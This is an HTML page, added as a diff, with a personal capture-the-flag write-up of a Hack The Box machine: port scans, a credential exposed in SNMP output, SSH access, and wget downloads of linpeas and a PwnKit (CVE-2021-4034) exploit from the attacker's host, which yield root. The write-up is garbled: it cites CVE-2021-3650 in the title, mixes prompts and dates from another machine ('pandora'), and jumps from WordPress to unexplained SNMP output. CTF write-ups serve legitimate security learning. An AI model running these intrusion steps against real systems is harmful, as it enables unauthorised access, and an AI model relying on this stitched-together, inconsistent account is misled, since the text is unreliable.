@@ -1,0 +1,315 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="shortcut icon" href="../../docs-assets/ico/favicon.png">
+
+<title>SUPPI - Write-ups</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="assets/css/bootstrap.css" rel="stylesheet">
+
+
+    <!-- Custom styles for this template -->
+    <link href="assets/css/main.css" rel="stylesheet">
+
+    <script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
+    <script src="assets/js/hover.zoom.js"></script>
+    <script src="assets/js/hover.zoom.conf.js"></script>
+
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+      <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+  </head>
+
+  <body>
+
+    <!-- Static navbar -->
+    <div class="navbar navbar-inverse navbar-static-top">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="index.html">SUPPI</a>
+        </div>
+        <div class="navbar-collapse collapse">
+          <ul class="nav navbar-nav navbar-right">
+            <li><a href="work.html">Write-up</a></li>
+            <li><a href="contact.html">Contact</a></li>
+          </ul>
+        </div><!--/.nav-collapse -->
+      </div>
+    </div>
+    
+        <h1 style="font-size:60px;font-family:Courier New;">Paper and CVE-2021-3650<sub style="font-size:13px">by suppi</sub></h1>
+    <div class="entry-content">
+<h1 id="introduction">Introduction</h1>
+<p>I do htb ctf and I'm tryin' to be better every day. This time we gonna exploit polkit vulnerability again. Now let's cut to the chase and root this server.
+</p>
+<h1 id="initial-enumerationservice-scan">Initial Enumeration</h1>
+<h3 id="initial-enumerationservice-scan">Service Scan</h3>
+<p>First thing I always do is nmap to find any possible port open. I use this command with -T5 for insane speed but reduce accuracy -n to skip DNS resolution(translating IP to the domain name).</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(suppie@parrot)-&#91;~]
+└─# nmap -p- --open -T5 -v -n 10.10.11.143
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-13 04:54 EDT
+Initiating Ping Scan at 04:54
+Scanning 10.10.11.143 [2 ports]
+Completed Ping Scan at 04:54, 0.18s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 04:54
+Completed Parallel DNS resolution of 1 host. at 04:54, 0.05s elapsed
+Initiating Connect Scan at 04:54
+Scanning 10.10.11.143 [65535 ports]
+Discovered open port 80/tcp on 10.10.11.143
+Discovered open port 22/tcp on 10.10.11.143
+Discovered open port 443/tcp on 10.10.11.143
+Warning: 10.10.11.143 giving up on port because retransmission cap hit (2).
+Connect Scan Timing: About 3.47% done; ETC: 05:09 (0:14:23 remaining)
+Connect Scan Timing: About 6.94% done; ETC: 05:09 (0:13:37 remaining)
+Connect Scan Timing: About 11.05% done; ETC: 05:08 (0:12:12 remaining)
+Connect Scan Timing: About 15.85% done; ETC: 05:07 (0:10:42 remaining)
+Connect Scan Timing: About 20.07% done; ETC: 05:07 (0:10:01 remaining)
+Connect Scan Timing: About 27.17% done; ETC: 05:07 (0:09:17 remaining)
+Connect Scan Timing: About 33.71% done; ETC: 05:07 (0:08:35 remaining)
+Connect Scan Timing: About 38.53% done; ETC: 05:07 (0:07:56 remaining)
+Connect Scan Timing: About 43.87% done; ETC: 05:07 (0:07:15 remaining)
+Connect Scan Timing: About 48.43% done; ETC: 05:07 (0:06:34 remaining)
+Connect Scan Timing: About 53.52% done; ETC: 05:07 (0:05:55 remaining)
+Connect Scan Timing: About 58.19% done; ETC: 05:07 (0:05:15 remaining)
+Connect Scan Timing: About 64.00% done; ETC: 05:07 (0:04:34 remaining)
+Connect Scan Timing: About 69.42% done; ETC: 05:07 (0:03:56 remaining)
+Connect Scan Timing: About 74.37% done; ETC: 05:07 (0:03:17 remaining)
+Connect Scan Timing: About 79.34% done; ETC: 05:07 (0:02:37 remaining)
+Connect Scan Timing: About 84.53% done; ETC: 05:07 (0:01:57 remaining)
+Connect Scan Timing: About 89.53% done; ETC: 05:07 (0:01:19 remaining)
+Connect Scan Timing: About 94.65% done; ETC: 05:07 (0:00:40 remaining)
+Completed Connect Scan at 05:08, 830.25s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.143
+Host is up (0.18s latency).
+Not shown: 59828 closed tcp ports (conn-refused), 5704 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 830.81 seconds
+</pre></div>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(suppie@parrot)-&#91;~]
+└─# nmap -sCV -p22,80,443  -v -n 10.10.11.143
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-13 04:58 EDT
+Nmap scan report for 10.10.11.143
+Host is up (0.44s latency).
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
+|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
+|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-title: HTTP Server Test Page powered by CentOS
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+| Subject Alternative Name: DNS:localhost.localdomain
+| Not valid before: 2021-07-03T08:52:34
+|_Not valid after:  2022-07-08T10:32:34
+|_http-title: HTTP Server Test Page powered by CentOS
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+|_ssl-date: TLS randomness does not represent time
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.50 seconds
+</pre></div>
+<p>I try pretty much a lot of things.<br>
+ + Find any available subdomain by gobuster.<br>
+ + Use sqlmap to check for SQL injection vulnerablities.<br>
+ + Use nikto to search for any anything useful.<br>
+ => It all didn't work.</p>
+<h3 id="initial-enumerationservice-scan">Find back-end server domain name</h3>
+<p>After this I do curl to collect header information also I do whatweb and collect the same domain name for backend-server that is office.paper.</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(suppie@parrot)-&#91;~]
+curl --head 10.10.11.143
+HTTP/1.1 403 Forbidden
+Date: Sun, 13 Mar 2022 08:57:47 GMT
+Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+X-Backend-Server: office.paper
+Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
+ETag: "30c0b-5c5c7fdeec240"
+Accept-Ranges: bytes
+Content-Length: 199691
+Content-Type: text/html; charset=UTF-8
+</pre></div>
+<p>To access this domain we have to put office.paper domain and 10.10.11.143 ip address into host address folder in order to host this website on our page.
+  </p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(suppie@parrot)-&#91;~]
+sudo nano /etc/hosts
+# Host addresses
+127.0.0.1  localhost
+127.0.1.1  suppies-parrot
+::1        localhost ip6-localhost ip6-loopback
+ff02::1    ip6-allnodes
+ff02::2    ip6-allrouters
+10.10.11.143 office.paper
+10.10.11.143 chat.office.paper
+</pre></div>
+<p>for a couple of minutes wandering around office.paper I find a login section and they use wordpress with version 5.2.3(you can use what web to find out wordpress version)
+  then I use searchsploit and find out it is vulnerable to cross-site host modification so go online to search for any information about this security hole..</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(suppie@parrot)-&#91;~]
+    searchsploit wordpress 5.2.3
+    </pre></div>
+<figure class="wp-block-image size-large"><img data-attachment-id="724" data-permalink="https://suppi147.github.io/suppisWriteup/suppi/" data-orig-file="https://suppi147.github.io/suppisWriteup/suppi/php.png" data-orig-size="999,562" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ssh" data-image-description="" data-image-caption="" data-medium-file="https://suppi147.github.io/suppisWriteup/suppi/php.png?w=300" data-large-file="https://suppi147.github.io/suppisWriteup/suppi/php.png?w=750" src="https://suppi147.github.io/suppisWriteup/suppi/php.png?w=999" alt="" class="wp-image-724" srcset="https://suppi147.github.io/suppisWriteup/suppi/php.png 999w, https://suppi147.github.io/suppisWriteup/suppi/php.png?w=150 150w, https://suppi147.github.io/suppisWriteup/suppi/php.png?w=300 300w, https://suppi147.github.io/suppisWriteup/suppi/php.png?w=768 768w" sizes="(max-width: 999px) 100vw, 999px" /><figcaption><strong>ssh to victim</strong></figcaption></figure>
+<p> The result is massive but eventually something cool show up(daniel....).</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(suppie@parrot)-&#91;~]
+    .1.3.6.1.2.1.25.4.2.1.5.1027 = STRING: "-k start"
+.1.3.6.1.2.1.25.4.2.1.5.1028 = STRING: "-k start"
+.1.3.6.1.2.1.25.4.2.1.5.1029 = STRING: "-k start"
+.1.3.6.1.2.1.25.4.2.1.5.1030 = STRING: "-k start"
+.1.3.6.1.2.1.25.4.2.1.5.1031 = STRING: "-k start"
+.1.3.6.1.2.1.25.4.2.1.5.1133 = STRING: "-u daniel -p HotelBabylon23"
+.1.3.6.1.2.1.25.4.2.1.5.1299 = STRING: "-k start"
+.1.3.6.1.2.1.25.4.2.1.5.1309 = STRING: "-k start"
+.1.3.6.1.2.1.25.4.2.1.5.1310 = STRING: "-k start"
+.1.3.6.1.2.1.25.4.2.1.5.1402 = STRING: "-k start"
+.1.3.6.1.2.1.25.4.2.1.5.1516 = STRING: "-k start"
+.1.3.6.1.2.1.25.4.2.1.5.1594 = STRING: "-k start"
+    </pre></div>
+<h1 id="initial-enumerationservice-scan">PRIVILEDGE ESCALATION</h1>
+<h3 id="initial-enumerationservice-scan">SSH</h3>
+<p>I use the credential which found above to ssh to server and it works but just normal priviledge. I will find the way up there later.</p>
+<figure class="wp-block-image size-large"><img data-attachment-id="724" data-permalink="https://suppi147.github.io/suppisWriteup/suppi/" data-orig-file="https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png" data-orig-size="999,562" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ssh" data-image-description="" data-image-caption="" data-medium-file="https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png?w=300" data-large-file="https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png?w=750" src="https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png?w=999" alt="" class="wp-image-724" srcset="https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png 999w, https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png?w=150 150w, https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png?w=300 300w, https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png?w=768 768w" sizes="(max-width: 999px) 100vw, 999px" /><figcaption><strong>ssh to victim</strong></figcaption></figure>
+<p>I use tmp folder to upload linpeas.sh in order to search for any possible root-free commands or cves. First, we have to create an http server on our computer by this command. After that, we connect to "our server" to download the script.</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(suppie@parrot)-&#91;~]
+    sudo python3 http.server 8080
+    </pre></div>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(daniel@pandora:/tmp)-&#91;~]
+wget http://10.10.14.32:8080/linpeas.sh
+--2022-02-22 10:23:28--  http://10.10.14.32:8080/linpeas.sh
+Connecting to 10.10.14.32:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 765822 (748K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                        100%[============================================================>] 747.87K  90.5KB/s    in 11s     
+
+2022-02-22 10:23:39 (68.6 KB/s) - ‘linpeas.sh’ saved [765822/765822]
+    </pre></div>
+    <p>Then we run the script(don't forget to allow it(chmod)). While I was looking into the result... oh hell yeah here come the bad boy CVE-2021-4034.</p>
+<figure class="wp-block-image size-large"><img data-attachment-id="724" data-permalink="https://suppi147.github.io/suppisWriteup/suppi/" data-orig-file="https://suppi147.github.io/suppisWriteup/suppi/cve.png" data-orig-size="999,562" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ssh" data-image-description="" data-image-caption="" data-medium-file="https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=300" data-large-file="https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=750" src="https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=999" alt="" class="wp-image-724" srcset="https://suppi147.github.io/suppisWriteup/suppi/cve.png 999w, https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=150 150w, https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=300 300w, https://suppi147.github.io/suppisWriteup/suppicves.png?w=768 768w" sizes="(max-width: 999px) 100vw, 999px" /><figcaption><strong>CVE-2021-4034</strong></figcaption></figure>
+<p>About this <a href="https://www.thesecmaster.com/how-to-fix-the-polkit-privilege-escalation-vulnerability-cve-2021-4034/">CVE-2021-4034</a>. To gain root, we need to build this file into a runable shell(make) then zip it for tranferring it through 8080 client-server and when we got the zip file on the target server we will unzip it.</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(daniel@pandora:/tmp)-&#91;~]
+wget http://10.10.14.32:8080/kkk.tar.gz
+--2022-02-22 10:26:33--  http://10.10.14.32:8080/kkk.tar.gz
+Connecting to 10.10.14.32:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 59096 (58K) [application/gzip]
+Saving to: ‘kkk.tar.gz’
+
+kkk.tar.gz                        100%[============================================================>]  57.71K  38.9KB/s    in 1.5s    
+
+2022-02-22 10:26:34 (38.9 KB/s) - ‘kkk.tar.gz’ saved [59096/59096]
+
+    </pre></div>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(daniel@pandora:/tmp)-&#91;~]
+tar -xvf kkk.tar.gz 
+CVE-2021-4034/.git/logs/refs/remotes/origin/HEAD
+CVE-2021-4034/.git/refs/remotes/origin/HEADdaniel@pandora:/tmp$ tar -xvf kkk.tar.gz 
+CVE-2021-4034/.git/logs/refs/remotes/origin/HEAD
+CVE-2021-4034/.git/refs/remotes/origin/HEAD
+...
+    </pre></div>
+<p>Now let get root.</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(daniel@pandora:/tmp)-&#91;~]
+ls
+CVE-2021-4034  systemd-private-75f90995316a4b18aa227cf33904883a-apache2.service-hM60xg
+]              systemd-private-75f90995316a4b18aa227cf33904883a-systemd-logind.service-ZleLji
+exploit.py     systemd-private-75f90995316a4b18aa227cf33904883a-systemd-resolved.service-aTBbrf
+exploit2.py    systemd-private-75f90995316a4b18aa227cf33904883a-systemd-timesyncd.service-y1vv4g
+kkk.tar.gz     tar
+linpeas.sh     tmux-1001
+revshell.php   vmware-root_723-4282236435
+daniel@pandora:/tmp$ cd CVE-2021-4034/
+daniel@pandora:/tmp/CVE-2021-4034$ ls
+'GCONV_PATH=.'   Makefile    cve-2021-4034     cve-2021-4034.sh   gconv-modules   pwnkit.so
+ LICENSE         README.md   cve-2021-4034.c   dry-run            pwnkit.c
+daniel@pandora:/tmp/CVE-2021-4034$ ./cve-2021-4034
+# whoami
+root
+    </pre></div>
+    <img src="https://suppi147.github.io/suppisWriteup/suppi/FOI.gif">
+
+    <!-- +++++ Projects Section +++++ -->
+        
+    <div class="container pt">
+        <div class="row mt">
+            <div class="col-lg-6 col-lg-offset-3 centered">
+
+            </div>
+        </div>
+        
+        </div><!-- /row -->
+    </div><!-- /container -->
+    
+    
+    <!-- +++++ Footer Section +++++ -->
+    
+    <div id="footer">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-4">
+                    <h4>My Bunker</h4>
+                    <p>
+                        423 Ward 5,<br/>
+                        +84 1921 5538,<br/>
+                        Bao Loc, Viet Nam.
+                    </p>
+                </div><!-- /col-lg-4 -->
+                
+                <div class="col-lg-4">
+                    <h4>My Links</h4>
+                    <p>
+                        <a href="https://www.facebook.com/khoi.lee.2090/">Facebook</a>
+                    </p>
+                </div><!-- /col-lg-4 -->
+                
+                <div class="col-lg-4">
+                    <h4>About suppi</h4>
+                    <p>I do what I love.</p>
+                </div><!-- /col-lg-4 -->
+            
+            </div>
+        
+        </div>
+    </div>
+    
+
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="assets/js/bootstrap.min.js"></script>
+  </body>
+</html>
+
+
+
+
+
